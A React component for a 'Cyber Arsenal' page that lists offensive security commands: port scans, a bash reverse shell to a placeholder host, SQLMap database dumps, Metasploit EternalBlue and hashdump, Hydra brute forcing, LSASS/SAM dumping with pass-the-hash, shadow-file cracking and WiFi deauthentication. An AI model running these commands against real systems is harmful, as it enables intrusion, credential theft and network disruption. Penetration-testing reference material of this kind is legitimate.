import { useState } from "react";
import { Search, Terminal, Copy, Play, ChevronRight } from "lucide-react";
import { ScrollArea } from "@/components/ui/scroll-area";
import { useLocation } from "wouter";
import { useAppContext } from "@/lib/app-context";
import { useToast } from "@/hooks/use-toast";

type Tool = {
  name: string;
  description: string;
  commands: { desc: string; cmd: string; demoCmd?: string }[];
};

type Category = {
  id: string;
  name: string;
  tag: string;
  accentColor: string;
  tools: Tool[];
};

const CATEGORIES: Category[] = [
  {
    id: "osint",
    name: "OSINT / Reconocimiento",
    tag: "RECON",
    accentColor: "#00ffff",
    tools: [
      {
        name: "Nmap",
        description: "Network Mapper — el estándar de escaneo de red",
        commands: [
          { desc: "Quick scan all ports", cmd: "nmap -p- --open --min-rate=5000 -n -Pn <target>", demoCmd: "nmap -p- --open localhost" },
          { desc: "Full service + OS detection", cmd: "nmap -A -T4 -p- <target>", demoCmd: "nmap -A localhost" },
          { desc: "Stealth SYN scan", cmd: "nmap -sS -T2 --randomize-hosts <target>", demoCmd: "nmap -sS localhost" },
          { desc: "UDP scan", cmd: "nmap -sU -T4 --top-ports 200 <target>", demoCmd: "echo 'nmap -sU target'" },
          { desc: "Vuln scripts", cmd: "nmap -sV --script=vuln <target>", demoCmd: "echo 'nmap --script=vuln target'" },
          { desc: "Banner grabbing", cmd: "nmap -sV --script=banner <target>", demoCmd: "echo 'nmap -sV --script=banner target'" },
          { desc: "SMB enumeration", cmd: "nmap -p 445 --script=smb-enum-shares,smb-enum-users <target>", demoCmd: "echo 'nmap smb scripts'" },
          { desc: "HTTP enumeration", cmd: "nmap -p 80,443,8080 --script=http-enum,http-title <target>", demoCmd: "echo 'nmap http scripts'" },
          { desc: "Save output XML", cmd: "nmap -oA scan_results -p- <target>", demoCmd: "echo 'nmap -oA results target'" },
          { desc: "Evade firewall (fragment)", cmd: "nmap -f --mtu 24 -D RND:5 <target>", demoCmd: "echo 'nmap evasion'" }
        ]
      },
      {
        name: "theHarvester",
        description: "Email, subdomain & people names harvester",
        commands: [
          { desc: "Google harvesting", cmd: "theHarvester -d <domain> -l 500 -b google", demoCmd: "echo 'theHarvester -d example.com -b google'" },
          { desc: "All sources", cmd: "theHarvester -d <domain> -b all", demoCmd: "echo 'theHarvester -d target.com -b all'" },
          { desc: "LinkedIn", cmd: "theHarvester -d <domain> -b linkedin", demoCmd: "echo 'theHarvester -d corp.com -b linkedin'" }
        ]
      },
      {
        name: "Sherlock",
        description: "Hunt down social media accounts by username",
        commands: [
          { desc: "Username search", cmd: "python3 sherlock.py <username>", demoCmd: "echo 'sherlock johndoe'" },
          { desc: "Multiple usernames", cmd: "python3 sherlock.py user1 user2 user3", demoCmd: "echo 'sherlock user1 user2'" },
          { desc: "Output to file", cmd: "python3 sherlock.py <username> --output results.txt", demoCmd: "echo 'sherlock -o results'" }
        ]
      }
    ]
  },
  {
    id: "escaneo",
    name: "Escaneo / Enumeración",
    tag: "SCAN",
    accentColor: "#00ff41",
    tools: [
      {
        name: "Masscan",
        description: "Async TCP port scanner — ultra rápido",
        commands: [
          { desc: "Scan full subnet fast", cmd: "masscan -p0-65535 10.0.0.0/8 --rate=10000", demoCmd: "echo 'masscan full scan'" },
          { desc: "Web ports + rate limit", cmd: "masscan -p80,443,8080,8443 192.168.1.0/24 --rate=1000", demoCmd: "echo 'masscan web ports'" },
          { desc: "Save to file", cmd: "masscan -p0-65535 <target> -oG results.gnmap", demoCmd: "echo 'masscan output'" }
        ]
      },
      {
        name: "Netcat (nc)",
        description: "TCP/UDP — the unix swiss army knife",
        commands: [
          { desc: "Listen on port", cmd: "nc -lvnp <port>", demoCmd: "echo 'nc listener'" },
          { desc: "Connect to host", cmd: "nc <target> <port>", demoCmd: "echo 'nc connect'" },
          { desc: "Port scan range", cmd: "nc -zv <target> 20-1000", demoCmd: "echo 'nc -zv localhost 80-90'" },
          { desc: "Reverse shell (bash)", cmd: "bash -i >& /dev/tcp/<lhost>/<lport> 0>&1", demoCmd: "echo 'reverse shell'" },
          { desc: "File transfer send", cmd: "nc -lvnp 4444 < file.txt", demoCmd: "echo 'nc file transfer'" }
        ]
      },
      {
        name: "Wireshark / tshark",
        description: "Network protocol analyzer — captura y analiza paquetes",
        commands: [
          { desc: "Capture on interface", cmd: "tshark -i eth0 -w capture.pcap", demoCmd: "echo 'tshark capture'" },
          { desc: "Filter HTTP traffic", cmd: "tshark -i eth0 -Y 'http' -T fields -e http.host -e http.request.uri", demoCmd: "echo 'tshark HTTP filter'" },
          { desc: "Capture passwords (FTP/HTTP)", cmd: "tshark -i eth0 -Y 'ftp.request.command == PASS || http.authbasic'", demoCmd: "echo 'tshark creds'" },
          { desc: "Follow TCP stream", cmd: "tshark -r capture.pcap -z follow,tcp,ascii,0", demoCmd: "echo 'tshark follow stream'" },
          { desc: "Capture specific port", cmd: "tshark -i eth0 -f 'port 443' -w https.pcap", demoCmd: "echo 'tshark port 443'" },
          { desc: "Read PCAP file", cmd: "tshark -r file.pcap -Y 'dns' -T fields -e dns.qry.name", demoCmd: "echo 'tshark read pcap'" }
        ]
      }
    ]
  },
  {
    id: "web",
    name: "Web Hacking",
    tag: "WEB",
    accentColor: "#ff9900",
    tools: [
      {
        name: "Burp Suite",
        description: "Web app security testing platform — proxy + scanner",
        commands: [
          { desc: "Start Burp headless", cmd: "java -jar -Xmx4g burpsuite_pro.jar --headless", demoCmd: "echo 'Burp Suite Pro headless mode'" },
          { desc: "Intercept with curl via Burp proxy", cmd: "curl -x http://127.0.0.1:8080 https://target.com --insecure", demoCmd: "echo 'curl through Burp proxy 8080'" },
          { desc: "Active scan URL (API)", cmd: "curl -s -X POST http://localhost:1337/v0.1/scan -d '{\"urls\":[{\"urls\":[\"https://target.com\"]}]}'", demoCmd: "echo 'Burp REST API scan'" },
          { desc: "Export report (Burp CLI)", cmd: "java -jar burp.jar --report-output=report.html", demoCmd: "echo 'Burp generate report'" },
          { desc: "Spider target site", cmd: "# Burp > Target > Scope > Add URL, Spider from here", demoCmd: "echo 'Burp spider'" },
          { desc: "SQLi via Intruder (payload list)", cmd: "# Load SQLi wordlist in Intruder > Sniper > Payloads > Simple list", demoCmd: "echo 'Burp Intruder SQLi'" },
          { desc: "Repeater request replay", cmd: "# Ctrl+R → Send to Repeater, modify & replay", demoCmd: "echo 'Burp Repeater workflow'" },
          { desc: "Match/Replace rule", cmd: "# Proxy > Options > Match and Replace > Add rule (e.g., User-Agent spoof)", demoCmd: "echo 'Burp match replace'" }
        ]
      },
      {
        name: "Nikto",
        description: "Web server scanner — archivos peligrosos y misconfigs",
        commands: [
          { desc: "Basic scan", cmd: "nikto -h http://<target>", demoCmd: "echo 'nikto -h http://localhost'" },
          { desc: "HTTPS scan", cmd: "nikto -h https://<target> -ssl", demoCmd: "echo 'nikto ssl scan'" },
          { desc: "Scan specific port", cmd: "nikto -h <target> -p 8080", demoCmd: "echo 'nikto -p 8080'" },
          { desc: "Via proxy (Burp)", cmd: "nikto -h <target> -useproxy http://127.0.0.1:8080", demoCmd: "echo 'nikto via proxy'" },
          { desc: "Save HTML report", cmd: "nikto -h <target> -o report.html -Format htm", demoCmd: "echo 'nikto html report'" },
          { desc: "Evasion techniques", cmd: "nikto -h <target> -evasion 1,2,3", demoCmd: "echo 'nikto evasion'" },
          { desc: "Auth (basic)", cmd: "nikto -h <target> -id user:pass", demoCmd: "echo 'nikto auth'" },
          { desc: "Full tuning (all checks)", cmd: "nikto -h <target> -Tuning x", demoCmd: "echo 'nikto full'" }
        ]
      },
      {
        name: "WPScan",
        description: "WordPress vulnerability scanner",
        commands: [
          { desc: "Basic WP scan", cmd: "wpscan --url http://<target>", demoCmd: "echo 'wpscan --url target'" },
          { desc: "Enumerate users", cmd: "wpscan --url http://<target> --enumerate u", demoCmd: "echo 'wpscan enumerate users'" },
          { desc: "Enumerate plugins (aggressive)", cmd: "wpscan --url http://<target> --enumerate p --plugins-detection aggressive", demoCmd: "echo 'wpscan plugins'" },
          { desc: "Password brute force", cmd: "wpscan --url http://<target> -U admin -P /usr/share/wordlists/rockyou.txt", demoCmd: "echo 'wpscan bruteforce'" },
          { desc: "API token (more data)", cmd: "wpscan --url http://<target> --api-token <TOKEN>", demoCmd: "echo 'wpscan api token'" },
          { desc: "Full enumeration", cmd: "wpscan --url http://<target> --enumerate u,p,t,tt,cb,dbe --plugins-detection aggressive", demoCmd: "echo 'wpscan full enum'" },
          { desc: "Random agent", cmd: "wpscan --url http://<target> --random-user-agent", demoCmd: "echo 'wpscan stealth'" }
        ]
      },
      {
        name: "SQLMap",
        description: "Automatic SQL injection & database takeover",
        commands: [
          { desc: "Basic GET injection", cmd: "sqlmap -u 'http://target.com/page?id=1' --dbs", demoCmd: "echo 'sqlmap --dbs'" },
          { desc: "POST request injection", cmd: "sqlmap -u 'http://target.com/login' --data='user=a&pass=b' --dbs", demoCmd: "echo 'sqlmap POST'" },
          { desc: "Dump all databases", cmd: "sqlmap -u '<url>' --dump-all --batch", demoCmd: "echo 'sqlmap dump'" },
          { desc: "Dump specific table", cmd: "sqlmap -u '<url>' -D dbname -T tablename --dump", demoCmd: "echo 'sqlmap table dump'" },
          { desc: "Bypass WAF (tamper)", cmd: "sqlmap -u '<url>' --tamper=space2comment,between --random-agent", demoCmd: "echo 'sqlmap tamper WAF bypass'" },
          { desc: "OS shell (if DBA)", cmd: "sqlmap -u '<url>' --os-shell", demoCmd: "echo 'sqlmap os-shell'" },
          { desc: "From Burp request file", cmd: "sqlmap -r request.txt --level=5 --risk=3 --dbs", demoCmd: "echo 'sqlmap from Burp request'" },
          { desc: "Cookie injection", cmd: "sqlmap -u '<url>' --cookie='session=abc123' --dbs", demoCmd: "echo 'sqlmap cookie'" },
          { desc: "Detect DBMS type", cmd: "sqlmap -u '<url>' --fingerprint", demoCmd: "echo 'sqlmap fingerprint'" }
        ]
      }
    ]
  },
  {
    id: "vuln",
    name: "Análisis de Vulnerabilidades",
    tag: "VULN",
    accentColor: "#ffcc00",
    tools: [
      {
        name: "Metasploit",
        description: "Advanced penetration testing framework",
        commands: [
          { desc: "Start console", cmd: "msfconsole -q", demoCmd: "echo '[+] Starting Metasploit...'" },
          { desc: "Search exploit", cmd: "search type:exploit platform:windows <keyword>", demoCmd: "echo 'search eternalblue'" },
          { desc: "Use module + show options", cmd: "use exploit/windows/smb/ms17_010_eternalblue && show options", demoCmd: "echo 'use eternalblue'" },
          { desc: "Set LHOST LPORT", cmd: "set LHOST <attacker_ip> && set LPORT 4444", demoCmd: "echo 'set LHOST/LPORT'" },
          { desc: "Run exploit", cmd: "exploit -j", demoCmd: "echo 'run exploit'" },
          { desc: "Meterpreter shell", cmd: "sessions -i 1 && sysinfo && getuid", demoCmd: "echo 'meterpreter session'" },
          { desc: "Post module (hashdump)", cmd: "use post/windows/gather/hashdump && run", demoCmd: "echo 'hashdump'" },
          { desc: "Privilege escalation", cmd: "getsystem && getprivs", demoCmd: "echo 'getsystem'" }
        ]
      }
    ]
  },
  {
    id: "password",
    name: "Password Cracking",
    tag: "CRACK",
    accentColor: "#ff5500",
    tools: [
      {
        name: "Hashcat",
        description: "World's fastest GPU-based password cracker",
        commands: [
          { desc: "MD5 dictionary attack", cmd: "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", demoCmd: "echo 'hashcat MD5 dict attack'" },
          { desc: "SHA-256 dictionary", cmd: "hashcat -m 1400 -a 0 hash.txt wordlist.txt", demoCmd: "echo 'hashcat SHA256'" },
          { desc: "NTLM (Windows)", cmd: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt", demoCmd: "echo 'hashcat NTLM'" },
          { desc: "WPA/WPA2 PMK", cmd: "hashcat -m 22000 -a 0 handshake.hc22000 rockyou.txt", demoCmd: "echo 'hashcat WPA2'" },
          { desc: "Brute force (mask)", cmd: "hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a --increment", demoCmd: "echo 'hashcat brute force mask'" },
          { desc: "Rule-based attack", cmd: "hashcat -m 0 -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule", demoCmd: "echo 'hashcat rules'" },
          { desc: "Show cracked passwords", cmd: "hashcat -m 0 hash.txt --show", demoCmd: "echo 'hashcat show'" },
          { desc: "Benchmark GPU", cmd: "hashcat -b", demoCmd: "echo 'hashcat benchmark'" },
          { desc: "Combinator attack", cmd: "hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt", demoCmd: "echo 'hashcat combinator'" }
        ]
      },
      {
        name: "John the Ripper",
        description: "Classic CPU-based password cracker",
        commands: [
          { desc: "Auto detect + crack", cmd: "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt", demoCmd: "echo 'john auto crack'" },
          { desc: "Show cracked passwords", cmd: "john hash.txt --show", demoCmd: "echo 'john --show'" },
          { desc: "Crack Linux /etc/shadow", cmd: "unshadow /etc/passwd /etc/shadow > hashes.txt && john hashes.txt", demoCmd: "echo 'john shadow'" },
          { desc: "Crack ZIP file", cmd: "zip2john protected.zip > zip.hash && john zip.hash --wordlist=rockyou.txt", demoCmd: "echo 'john zip crack'" },
          { desc: "Crack SSH private key", cmd: "ssh2john id_rsa > id_rsa.hash && john id_rsa.hash --wordlist=rockyou.txt", demoCmd: "echo 'john ssh key'" },
          { desc: "Crack PDF", cmd: "pdf2john file.pdf > pdf.hash && john pdf.hash", demoCmd: "echo 'john pdf crack'" },
          { desc: "Incremental brute force", cmd: "john hash.txt --incremental=All", demoCmd: "echo 'john incremental'" },
          { desc: "Rules attack", cmd: "john hash.txt --wordlist=rockyou.txt --rules=Jumbo", demoCmd: "echo 'john rules'" }
        ]
      },
      {
        name: "Hydra",
        description: "Network login cracker — brute force online services",
        commands: [
          { desc: "SSH brute force", cmd: "hydra -l <user> -P rockyou.txt ssh://<target>", demoCmd: "echo 'hydra SSH bruteforce'" },
          { desc: "SSH user list", cmd: "hydra -L users.txt -P passwords.txt ssh://<target> -t 4", demoCmd: "echo 'hydra SSH user list'" },
          { desc: "HTTP POST login", cmd: "hydra -l admin -P rockyou.txt <target> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", demoCmd: "echo 'hydra HTTP POST login'" },
          { desc: "FTP brute force", cmd: "hydra -l <user> -P rockyou.txt ftp://<target>", demoCmd: "echo 'hydra FTP'" },
          { desc: "RDP brute force", cmd: "hydra -l administrator -P rockyou.txt rdp://<target>", demoCmd: "echo 'hydra RDP'" },
          { desc: "SMB brute force", cmd: "hydra -l admin -P rockyou.txt smb://<target>", demoCmd: "echo 'hydra SMB'" },
          { desc: "MySQL brute force", cmd: "hydra -l root -P rockyou.txt mysql://<target>", demoCmd: "echo 'hydra MySQL'" },
          { desc: "HTTP Basic Auth", cmd: "hydra -l admin -P rockyou.txt <target> http-get /protected", demoCmd: "echo 'hydra HTTP basic auth'" },
          { desc: "Verbose output", cmd: "hydra -l <user> -P rockyou.txt ssh://<target> -V -o results.txt", demoCmd: "echo 'hydra verbose'" }
        ]
      }
    ]
  },
  {
    id: "post",
    name: "Post-Explotación",
    tag: "POST-EX",
    accentColor: "#ff7700",
    tools: [
      {
        name: "NetExec (nxc)",
        description: "Network service exploitation & lateral movement (sucesor de CrackMapExec)",
        commands: [
          { desc: "Check SMB auth", cmd: "nxc smb <target> -u <user> -p <pass>", demoCmd: "echo 'nxc smb auth check'" },
          { desc: "Dump SAM database", cmd: "nxc smb <target> -u admin -p pass --sam", demoCmd: "echo 'nxc --sam dump'" },
          { desc: "Dump LSASS secrets", cmd: "nxc smb <target> -u admin -p pass --lsa", demoCmd: "echo 'nxc --lsa dump'" },
          { desc: "Pass-the-Hash (PTH)", cmd: "nxc smb <target> -u Administrator -H <NTLM_hash>", demoCmd: "echo 'nxc pass-the-hash'" },
          { desc: "Execute command", cmd: "nxc smb <target> -u admin -p pass -x 'whoami'", demoCmd: "echo 'nxc exec command'" },
          { desc: "RDP check", cmd: "nxc rdp <target> -u admin -p pass", demoCmd: "echo 'nxc rdp check'" },
          { desc: "WinRM check", cmd: "nxc winrm <target> -u admin -p pass", demoCmd: "echo 'nxc winrm'" },
          { desc: "Spider shares", cmd: "nxc smb <target> -u admin -p pass --spider C$", demoCmd: "echo 'nxc spider shares'" },
          { desc: "Enumerate users (LDAP)", cmd: "nxc ldap <target> -u admin -p pass --users", demoCmd: "echo 'nxc ldap users'" },
          { desc: "Bloodhound collection", cmd: "nxc ldap <target> -u admin -p pass --bloodhound --collection All", demoCmd: "echo 'nxc bloodhound'" }
        ]
      }
    ]
  },
  {
    id: "wifi",
    name: "Redes / WiFi",
    tag: "WIRELESS",
    accentColor: "#cc44ff",
    tools: [
      {
        name: "Aircrack-ng Suite",
        description: "802.11 WEP/WPA-PSK cracking — suite completa",
        commands: [
          { desc: "Enable monitor mode", cmd: "airmon-ng start wlan0", demoCmd: "echo 'airmon-ng start wlan0'" },
          { desc: "Kill interfering processes", cmd: "airmon-ng check kill", demoCmd: "echo 'airmon-ng check kill'" },
          { desc: "Scan all APs", cmd: "airodump-ng wlan0mon", demoCmd: "echo 'airodump-ng wlan0mon'" },
          { desc: "Capture target handshake", cmd: "airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon", demoCmd: "echo 'airodump-ng targeted capture'" },
          { desc: "Deauth attack (force handshake)", cmd: "aireplay-ng -0 10 -a <BSSID> -c <client_MAC> wlan0mon", demoCmd: "echo 'aireplay deauth'" },
          { desc: "Crack WPA2 handshake", cmd: "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> capture.cap", demoCmd: "echo 'aircrack-ng crack'" },
          { desc: "Crack WEP", cmd: "aircrack-ng capture.cap", demoCmd: "echo 'aircrack-ng WEP'" },
          { desc: "PMKID attack (no client)", cmd: "hcxdumptool -i wlan0mon -o pmkid.pcapng && hcxpcapngtool pmkid.pcapng -o hash.hc22000 && hashcat -m 22000 hash.hc22000 rockyou.txt", demoCmd: "echo 'PMKID attack'" },
          { desc: "Stop monitor mode", cmd: "airmon-ng stop wlan0mon && service NetworkManager restart", demoCmd: "echo 'stop monitor mode'" }
        ]
      }
    ]
  }
];

export default function Tools() {
  const [search, setSearch] = useState("");
  const [expandedTool, setExpandedTool] = useState<string | null>(null);
  const [, setLocation] = useLocation();
  const { setCurrentCode, setCurrentLanguage } = useAppContext();
  const { toast } = useToast();

  const filteredCategories = CATEGORIES.map(cat => ({
    ...cat,
    tools: cat.tools.filter(tool =>
      tool.name.toLowerCase().includes(search.toLowerCase()) ||
      tool.description.toLowerCase().includes(search.toLowerCase()) ||
      tool.commands.some(c => c.cmd.toLowerCase().includes(search.toLowerCase()) || c.desc.toLowerCase().includes(search.toLowerCase()))
    )
  })).filter(cat => cat.tools.length > 0);

  const runDemoCommand = (cmd: string) => {
    setCurrentCode(cmd);
    setCurrentLanguage("bash");
    setLocation("/");
    toast({ title: "// LOADED", description: "Command ready in workspace." });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({ title: "// COPIED" });
  };

  const totalTools = CATEGORIES.reduce((s, c) => s + c.tools.length, 0);
  const totalCmds = CATEGORIES.reduce((s, c) => s + c.tools.reduce((ss, t) => ss + t.commands.length, 0), 0);

  return (
    <div className="flex flex-col h-full bg-[#070707]">
      {/* Header */}
      <div className="border-b border-[#ff003c]/15 bg-[#060606] px-4 py-3 flex flex-col md:flex-row justify-between items-start md:items-center gap-3">
        <div>
          <h1 className="text-xs font-mono font-bold tracking-[0.25em] uppercase text-[#ff003c]" style={{ textShadow: "0 0 10px #ff003c60" }}>
            // CYBER ARSENAL
          </h1>
          <p className="text-[10px] font-mono text-[#2a2a2a] tracking-widest uppercase mt-0.5">
            {totalTools} tools · {totalCmds} commands · use responsibly
          </p>
        </div>

        <div className="relative w-full md:w-80">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3 w-3 text-[#333]" />
          <input
            placeholder="SEARCH TOOLS / COMMANDS..."
            className="w-full bg-[#040404] border border-[#ff003c]/20 pl-8 pr-3 py-2 font-mono text-xs text-[#888] placeholder:text-[#1a1a1a] placeholder:tracking-widest focus:outline-none focus:border-[#ff003c]/50 tracking-wider uppercase"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
        </div>
      </div>

      <ScrollArea className="flex-1 p-3 md:p-5">
        <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-4 max-w-7xl mx-auto">
          {filteredCategories.map(cat => (
            <div key={cat.id} className="flex flex-col gap-3">
              {/* Category header */}
              <div className="flex items-center gap-2 px-3 py-2 border border-l-2 bg-[#060606]"
                style={{ borderColor: cat.accentColor + "20", borderLeftColor: cat.accentColor }}>
                <span className="text-[9px] font-mono font-bold tracking-[0.3em] uppercase"
                  style={{ color: cat.accentColor, textShadow: `0 0 6px ${cat.accentColor}60` }}>
                  [{cat.tag}]
                </span>
                <span className="text-[10px] font-mono text-[#444] tracking-wider">{cat.name}</span>
              </div>

              {/* Tools */}
              <div className="flex flex-col gap-2">
                {cat.tools.map((tool, idx) => {
                  const toolKey = `${cat.id}-${idx}`;
                  const isExpanded = expandedTool === toolKey;
                  return (
                    <div
                      key={idx}
                      className="border border-[#161616] bg-[#060606] overflow-hidden transition-all hover:border-[#222]"
                      style={isExpanded ? { borderLeftColor: cat.accentColor, borderLeftWidth: "2px" } : {}}
                    >
                      <button
                        className="w-full flex items-center justify-between px-3 py-2.5 text-left hover:bg-[#0a0a0a] transition-colors"
                        onClick={() => setExpandedTool(isExpanded ? null : toolKey)}
                      >
                        <div className="flex items-center gap-2 min-w-0">
                          <Terminal className="h-3 w-3 flex-shrink-0" style={{ color: cat.accentColor + "70" }} />
                          <div className="min-w-0">
                            <div className="text-[11px] font-mono font-bold text-[#aaa] uppercase tracking-wider">{tool.name}</div>
                            <div className="text-[9px] font-mono text-[#2a2a2a] mt-0.5 normal-case tracking-normal truncate">{tool.description}</div>
                          </div>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0 ml-2">
                          <span className="text-[9px] font-mono text-[#222]">{tool.commands.length}cmd</span>
                          <ChevronRight className={`h-3 w-3 text-[#2a2a2a] transition-transform ${isExpanded ? "rotate-90" : ""}`} />
                        </div>
                      </button>

                      {isExpanded && (
                        <div className="border-t border-[#0f0f0f]">
                          {tool.commands.map((cmd, i) => (
                            <div
                              key={i}
                              className="px-3 py-2.5 bg-black/40 border-b border-[#0f0f0f] last:border-b-0 group"
                            >
                              <div className="text-[9px] font-mono text-[#2a2a2a] uppercase tracking-[0.2em] mb-1.5">{cmd.desc}</div>
                              <div className="flex items-start justify-between gap-2">
                                <code className="text-[11px] font-mono text-[#00ff41] flex-1 select-all break-all leading-relaxed"
                                  style={{ textShadow: "0 0 4px #00ff4115" }}>
                                  $ {cmd.cmd}
                                </code>
                                <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0 pt-0.5">
                                  <button
                                    onClick={() => copyToClipboard(cmd.cmd)}
                                    className="p-1 text-[#2a2a2a] hover:text-[#888] transition-colors"
                                    title="Copy"
                                  >
                                    <Copy className="h-3 w-3" />
                                  </button>
                                  {cmd.demoCmd && (
                                    <button
                                      onClick={() => runDemoCommand(cmd.demoCmd!)}
                                      className="p-1 transition-colors"
                                      style={{ color: cat.accentColor + "70" }}
                                      title="Run in workspace"
                                    >
                                      <Play className="h-3 w-3" />
                                    </button>
                                  )}
                                </div>
                              </div>
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          ))}

          {filteredCategories.length === 0 && (
            <div className="col-span-full py-16 text-center font-mono text-xs text-[#1a1a1a] tracking-widest uppercase">
              — NO RESULTS FOR "{search}" —
            </div>
          )}
        </div>
      </ScrollArea>
    </div>
  );
}
